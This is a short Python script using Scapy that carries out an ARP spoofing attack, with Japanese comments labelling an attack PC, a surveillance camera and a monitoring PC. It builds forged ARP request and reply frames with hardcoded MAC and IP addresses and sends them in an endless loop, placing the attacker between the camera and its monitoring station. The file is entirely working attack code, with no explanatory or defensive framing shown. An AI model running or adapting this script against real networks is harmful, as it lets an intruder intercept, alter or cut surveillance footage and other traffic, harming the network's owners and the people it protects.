# arp_spoofing.py
from scapy.all import *
import time 

IF = "イーサネット"

mac0 = "A0:CE:C8:A4:EB:D5" #攻撃用PC

mac1 = "08:00:23:9C:31:FF" #監視カメラ
mac2 = "D0:BF:9C:E2:25:2D" #監視用PC

ip1 = "172.23.41.26"  #監視カメラ
ip2 = "172.23.41.123" #監視用PC

frame11 = Ether(dst=mac1,src=mac0) / ARP(op=1,pdst=ip1,psrc=ip2,hwsrc=mac0)
frame12 = Ether(dst=mac1,src=mac0) / ARP(op=2,pdst=ip1,psrc=ip2,hwsrc=mac0)
frame21 = Ether(dst=mac2,src=mac0) / ARP(op=1,pdst=ip2,psrc=ip1,hwsrc=mac0)
frame22 = Ether(dst=mac2,src=mac0) / ARP(op=2,pdst=ip2,psrc=ip1,hwsrc=mac0)

while True:
    frame11.show()
    sendp(frame11,iface=IF)
    frame12.show()
    sendp(frame12,iface=IF)
    time.sleep(0.5)

    frame21.show()
    sendp(frame21,iface=IF)
    frame22.show()
    sendp(frame22,iface=IF)
    time.sleep(0.5)
